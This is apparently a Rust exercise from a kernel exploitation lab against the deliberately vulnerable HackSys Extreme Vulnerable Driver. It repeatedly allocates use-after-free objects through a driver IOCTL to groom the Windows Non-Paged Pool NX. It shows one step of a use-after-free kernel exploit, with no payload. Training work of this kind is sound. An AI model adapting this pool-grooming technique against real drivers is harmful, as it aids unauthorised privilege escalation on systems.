use std::ptr::{null, null_mut};

use win_kexp::{
    win32k::{
        close_handle, get_device_handle, io_device_control, FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN,
        HANDLE, METHOD_NEITHER,
    },
    CTL_CODE, IOCTL,
};

const HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX: u32 = IOCTL!(0x814);

fn allocate_uaf_object_non_paged_pool_nx(h_device: HANDLE) -> u32 {
    io_device_control(
        h_device,
        HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX,
        null(),
        0,
        null_mut(),
        0,
    )
}

fn main() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Normalising Non-Paged Pool NX with UAF object...");
    for _ in 0..0x80 {
        allocate_uaf_object_non_paged_pool_nx(h_device);
    }

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");
}
